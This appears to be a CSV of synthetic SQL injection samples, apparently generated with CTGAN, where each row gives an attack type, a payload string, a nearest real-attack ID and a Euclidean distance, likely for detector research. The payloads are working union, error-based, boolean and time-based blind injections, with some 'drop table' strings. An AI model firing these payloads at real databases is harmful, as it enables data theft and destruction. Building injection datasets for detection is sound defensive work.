CTGAN_000875,attack,error,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006016,4.10301484006108
CTGAN_000876,attack,other,"1"" where 8918  =  8918   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",nearest_attack_euclidean,R002489,7.844353510258397
CTGAN_000877,attack,boolean,-6890'   )    )    or 5771  =  7721--,nearest_attack_euclidean,R002372,2.417830147029486
CTGAN_000878,attack,error,"1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R004007,4.981983464786505
CTGAN_000879,attack,error,"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R002980,5.884356108555802
CTGAN_000880,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000108,11.977467073712122
CTGAN_000881,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R008103,3.3528132870833347
CTGAN_000882,attack,union,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",nearest_attack_euclidean,R005793,5.956763189556958
CTGAN_000883,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",nearest_attack_euclidean,R005523,3.909394815543373
CTGAN_000884,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",nearest_attack_euclidean,R001746,4.29219187824878
CTGAN_000885,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R007942,25.470963697003594
CTGAN_000886,attack,union,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001632,3.153564121322255
CTGAN_000887,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000773,2.792855854461958
CTGAN_000888,attack,boolean,"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R007789,4.271097674342123
CTGAN_000889,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",nearest_attack_euclidean,R001572,2.9227752407373395
CTGAN_000890,attack,boolean,select * from users where id  =  1   or 1  =  1 -- 1,nearest_attack_euclidean,R000087,2.514698663361093
CTGAN_000891,attack,error,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  8529  =  8529",nearest_attack_euclidean,R007446,2.5356623652431995
CTGAN_000892,attack,other,"elt  (  2567  =  9921,9921  )  ",nearest_attack_euclidean,R007097,3.6083351704211197
CTGAN_000893,attack,boolean,1' in boolean mode  )   and 3787  =  7750--,nearest_attack_euclidean,R007141,2.684380284501086
CTGAN_000894,attack,error,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",nearest_attack_euclidean,R006154,4.373669699937694
CTGAN_000895,attack,time,1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R004043,3.715200238829891
CTGAN_000896,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R008216,3.9166195651141273
CTGAN_000897,attack,boolean,-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',nearest_attack_euclidean,R007629,3.489263399866838
CTGAN_000898,attack,boolean,  )   or true--,nearest_attack_euclidean,R000422,1.922098797621892
CTGAN_000899,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001214,4.423383412589738
CTGAN_000900,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",nearest_attack_euclidean,R007411,4.8396197212606795
CTGAN_000901,attack,other,"1""  )   as wehx where 5744  =  5744",nearest_attack_euclidean,R006348,6.634401190790636
CTGAN_000902,attack,boolean,"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr",nearest_attack_euclidean,R001662,1.464448834274107
CTGAN_000903,attack,other,or,nearest_attack_euclidean,R000581,3.839078141457949
CTGAN_000904,attack,other,or 'whatever' in   (  'whatever'  ) ,nearest_attack_euclidean,R000348,3.2278107016108346
CTGAN_000905,attack,error,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R003669,2.0137903191475766
CTGAN_000906,attack,boolean,"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",nearest_attack_euclidean,R001901,6.847048364715127
CTGAN_000907,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000608,2.9177082947647035
CTGAN_000908,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'asdc' like 'asdc",nearest_attack_euclidean,R001374,3.4266025288579534
CTGAN_000909,attack,boolean,"1""   )    )    and make_set  (  8266  =  9226,9226  )   and    (    (   ""omjx"" like ""omjx",nearest_attack_euclidean,R002705,2.133689378589125
CTGAN_000910,attack,time,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R003636,7.809185163817669
CTGAN_000911,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R004728,4.1467269665774396
CTGAN_000912,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,7.369791929902902
CTGAN_000913,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,nearest_attack_euclidean,R005105,3.6586507557306347
CTGAN_000914,attack,boolean,"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R007862,3.9540545397148303
CTGAN_000915,attack,boolean,"1%""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R005663,4.015308154557874
CTGAN_000916,attack,union,"-4166%""  )   union all select 5190--",nearest_attack_euclidean,R002242,4.472040623246957
CTGAN_000917,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000803,3.268406058322547
CTGAN_000918,attack,union,"1""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R006233,3.913006619833791
CTGAN_000919,attack,boolean,"-2916""   )    )    or 4946  =  8232--",nearest_attack_euclidean,R002850,2.444455472758216
CTGAN_000920,attack,other,"1""   )    )    as ikuz where 7385  =  7385",nearest_attack_euclidean,R007448,3.576954792324762
CTGAN_000921,attack,boolean,1' in boolean mode  )   and 3787  =  7750--,nearest_attack_euclidean,R007141,2.910936083864218
CTGAN_000922,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R006767,3.327323255049089
CTGAN_000923,attack,boolean,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002947,2.2166528008752624
CTGAN_000924,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R004614,3.615424804833416
CTGAN_000925,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R006713,4.726457358383905
CTGAN_000926,attack,error,1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'fbzo' like 'fbzo,nearest_attack_euclidean,R003836,2.89250070198375
CTGAN_000927,attack,union,"1""  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R005296,2.5897650455433667
CTGAN_000928,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000995,4.0485716497304285
CTGAN_000929,attack,other," , drop table temp --",nearest_attack_euclidean,R000360,2.306391131889487
CTGAN_000930,attack,boolean,"1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004574,2.81897354978116
CTGAN_000931,attack,boolean,"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",nearest_attack_euclidean,R003592,2.8131939389824145
CTGAN_000932,attack,union,"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R003176,2.650276833576778
CTGAN_000933,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R003923,2.1367546760200304
CTGAN_000934,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R006831,4.949447432276547
CTGAN_000935,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R008706,4.9775416148731235
CTGAN_000936,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.403363902389403
CTGAN_000937,attack,error,"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R005561,4.057013515112475
CTGAN_000938,attack,boolean,"1'  )   and make_set  (  7187  =  4625,4625  )   and   (  'diai' like 'diai",nearest_attack_euclidean,R006984,2.395353145801169
CTGAN_000939,attack,boolean,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",nearest_attack_euclidean,R002099,3.409462045791721
CTGAN_000940,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R004349,6.927684410621996
CTGAN_000941,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R007275,3.5805324366823963
CTGAN_000942,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000070,3.7300971020493856
CTGAN_000943,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000559,7.5095724126918775
CTGAN_000944,attack,boolean,"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rnyb'  =  'rnyb",nearest_attack_euclidean,R007344,3.9366573927785464
CTGAN_000945,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R003864,2.794505395187644
CTGAN_000946,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R006144,6.825733249284581
CTGAN_000947,attack,other,"1""   )    )    as irrz where 8730  =  8730 order by 1#",nearest_attack_euclidean,R004807,5.13012827124138
CTGAN_000948,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R002647,4.766946106135443
CTGAN_000949,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R001469,3.571827158752429
CTGAN_000950,attack,error,"-7345%"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R006116,3.0433688601577025
CTGAN_000951,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R006162,3.444168070246597
CTGAN_000952,attack,union,"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",nearest_attack_euclidean,R000884,3.3883415749413803
CTGAN_000953,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,2.328612225406554
CTGAN_000954,attack,other,1'||  (  select 'dezl' where 8661  =  8661,nearest_attack_euclidean,R004602,2.9497727929414066
CTGAN_000955,attack,union,"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",nearest_attack_euclidean,R006330,3.0762953478230326
CTGAN_000956,attack,union,"1  )   union all select null,null,null,null#",nearest_attack_euclidean,R002547,3.3822813130857794
CTGAN_000957,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,3.218856637058665
CTGAN_000958,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001072,3.8792523241013224
CTGAN_000959,attack,other,select case when 1892  =  3646 then 1 else null end--,nearest_attack_euclidean,R001090,2.6411713738031906
CTGAN_000960,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R005090,5.86345926487118
CTGAN_000961,attack,boolean,"1'   )    )    as anaq where 9605  =  9605 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R007064,1.5495239105328218
CTGAN_000962,attack,time,1' or sleep  (  5  )   and 'udqz'  =  'udqz,nearest_attack_euclidean,R006689,1.6227920570200614
CTGAN_000963,attack,other,"1"" where 8918  =  8918   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",nearest_attack_euclidean,R002489,9.35004897371389
CTGAN_000964,attack,union,"1""  )   as upyn where 6185  =  6185 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003725,5.268891430591862
CTGAN_000965,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",nearest_attack_euclidean,R005901,4.530047287409551
CTGAN_000966,attack,boolean,"-9676 or elt  (  1032  =  1032,3623  )  # jcaq",nearest_attack_euclidean,R004989,3.4440203520842134
CTGAN_000967,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,2.786405732411087
CTGAN_000968,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",nearest_attack_euclidean,R002636,3.07873356177577
CTGAN_000969,attack,other,"1""   )    )    as chal where 6661  =  6661",nearest_attack_euclidean,R002111,3.9465732782715808
CTGAN_000970,attack,boolean,"-1197""   )    )    as dfsy where 8857  =  8857 or 3038  =  3038",nearest_attack_euclidean,R006596,1.5864296327343343
CTGAN_000971,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R004003,4.973644348216618
CTGAN_000972,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004090,4.151140385745625
CTGAN_000973,attack,time,"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008560,4.983057690277496
CTGAN_000974,attack,error,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",nearest_attack_euclidean,R006105,2.1964920569264286
CTGAN_000975,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",nearest_attack_euclidean,R008226,5.548564608751406
CTGAN_000976,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R008634,3.362245644260398
CTGAN_000977,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",nearest_attack_euclidean,R003987,3.8596390988449327
CTGAN_000978,attack,union,union all select @@version--,nearest_attack_euclidean,R000444,5.252971836544727
CTGAN_000979,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,8.52008832347113
CTGAN_000980,attack,time,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",nearest_attack_euclidean,R006609,4.177915958959847
CTGAN_000981,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.064468609218379
CTGAN_000982,attack,time,"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005449,7.09743165317523
CTGAN_000983,attack,other," , drop table temp --",nearest_attack_euclidean,R000360,3.392138202247162
CTGAN_000984,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R006838,4.9161069295690725
CTGAN_000985,attack,other,1' in boolean mode  ) ,nearest_attack_euclidean,R006633,2.0134575715005743
CTGAN_000986,attack,boolean,1%'   )    )    and 2006  =  2006,nearest_attack_euclidean,R005924,1.595994028137356
CTGAN_000987,attack,time,1' in boolean mode  )   and sleep  (  5  )  #,nearest_attack_euclidean,R002626,4.309489012945564
CTGAN_000988,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R001918,4.230026349072694
CTGAN_000989,attack,other,1   )    )    as syot where 1199  =  1199,nearest_attack_euclidean,R005149,1.5422703193915832
CTGAN_000990,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,4.874303835149376
CTGAN_000991,attack,time,1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,nearest_attack_euclidean,R001700,3.6350571130353373
CTGAN_000992,attack,error,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000682,6.053221254223311
CTGAN_000993,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,3.8200541924055895
CTGAN_000994,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000595,5.266144053302234
CTGAN_000995,attack,error,"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R003155,3.518318125433579
CTGAN_000996,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R003450,4.287874813433452
CTGAN_000997,attack,time,"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R007488,10.285566388927311
CTGAN_000998,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,5.155354722362307
CTGAN_000999,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R002605,2.171206231081783
CTGAN_001000,attack,other,1 where 1092  =  1092,nearest_attack_euclidean,R003952,2.399627444798848
CTGAN_001001,attack,boolean,"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006066,3.103942283204908
CTGAN_001002,attack,time,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R001896,7.555001574475994
CTGAN_001003,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,3.2412112176186367
CTGAN_001004,attack,boolean,"-7551 or elt  (  6900  =  7195,7195  )  ",nearest_attack_euclidean,R005438,2.2414281262780915
CTGAN_001005,attack,time,1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',nearest_attack_euclidean,R002802,6.626877301695122
CTGAN_001006,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,4.812243288050345
CTGAN_001007,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",nearest_attack_euclidean,R001572,3.379388927149721
CTGAN_001008,attack,boolean,"1'  )   and elt  (  3528  =  3566,3566  )  ",nearest_attack_euclidean,R000949,2.1266978902442766
CTGAN_001009,attack,time,1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003201,4.682636898305862
CTGAN_001010,attack,boolean,1 and 9198  =  9198--,nearest_attack_euclidean,R005658,2.1023302182949006
CTGAN_001011,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R001955,4.108831148007564
CTGAN_001012,attack,boolean,"-5431""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ipmo""  =  ""ipmo",nearest_attack_euclidean,R008124,5.5551078898174415
CTGAN_001013,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,1.258902247944362
CTGAN_001014,attack,time,1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R008178,4.0731757236002295
CTGAN_001015,attack,error,1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',nearest_attack_euclidean,R001803,6.874797206342863
CTGAN_001016,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R005300,4.277304475719693
CTGAN_001017,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R001724,3.8962475701719472
CTGAN_001018,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R005116,4.17456176348119
CTGAN_001019,attack,boolean,-9721'  )   or 9287  =  4362#,nearest_attack_euclidean,R007081,2.3693930612656158
CTGAN_001020,attack,time,"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R007488,12.516971850267543
CTGAN_001021,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R002939,4.0257207404300495
CTGAN_001022,attack,error,"1   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  6395  =  6395",nearest_attack_euclidean,R008817,4.328107792166007
CTGAN_001023,attack,boolean,"1' and make_set  (  4952  =  7129,7129  )  ",nearest_attack_euclidean,R006310,2.386288068379124
CTGAN_001024,attack,union,"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",nearest_attack_euclidean,R007524,4.378865306598244
CTGAN_001025,attack,union,-3598  )   union all select 2264#,nearest_attack_euclidean,R000848,2.5993479860151183
CTGAN_001026,attack,error,"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh",nearest_attack_euclidean,R008636,4.120717198136167
CTGAN_001027,attack,other,1'  )   as fkpn where 1100  =  1100,nearest_attack_euclidean,R007606,2.673599847927358
CTGAN_001028,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R005966,3.3198718461859853
